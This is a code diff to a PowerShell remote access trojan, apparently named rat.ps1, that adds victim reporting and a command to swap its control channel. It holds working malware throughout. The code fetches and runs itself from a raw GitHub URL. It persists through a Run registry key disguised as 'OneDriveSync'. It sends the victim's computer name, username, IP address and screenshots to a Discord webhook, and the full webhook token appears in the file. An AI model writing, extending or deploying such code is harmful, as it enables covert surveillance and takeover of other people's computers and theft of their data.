@@ -8,6 +8,8 @@ $RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
+$L='1523845613177929828'
+$HF=Join-Path $env:TEMP 'rat_hook.txt'
 
 # ---- dedup: exit if another rat.ps1 is already running ----
 try{
@@ -236,6 +238,7 @@ function Self-Destruct{
   try{
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
     Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
+    Remove-Item $HF -Force -EA 0
     Post '`[+] self destructed`'
     exit
   }catch{ exit }
@@ -311,7 +314,13 @@ $f.ShowDialog()
 # ---- Command dispatcher ----
 function Run-Cmd($c){
   try{
-    if($c -eq 'proclist'){
+    if($c -like 'hook:*'){
+      $W=$c.Substring(5)
+      Set-Content $HF $W -Force
+      Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
+      Shot
+    }
+    elseif($c -eq 'proclist'){
       $o=Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name,Id,@{n='CPU';e={[math]::Round($_.CPU,1)}},@{n='MB';e={[math]::Round($_.WS/1MB,1)}} | Out-String -Width 200
       Post $o
     }
@@ -362,8 +371,27 @@ function Run-Cmd($c){
   }catch{}
 }
 
+# ---- startup: persist + boot notify ----
+try{
+  $k=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
+  if(-not $k){
+    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
+  }
+}catch{}
+$VN=$env:COMPUTERNAME
+$VU=$env:USERNAME
+$VI=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
+if(Test-Path $HF){
+  $W=(Get-Content $HF -Raw).Trim()
+  Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
+  Shot
+}else{
+  Post "NEWVICTIM $VN $VU $VI"
+}
+
 # ---- main loop ----
-Post '`[+] rat online`'
+Post '`[+] rat online`' 
 while($true){
   try{
     $wc=New-Object Net.WebClient
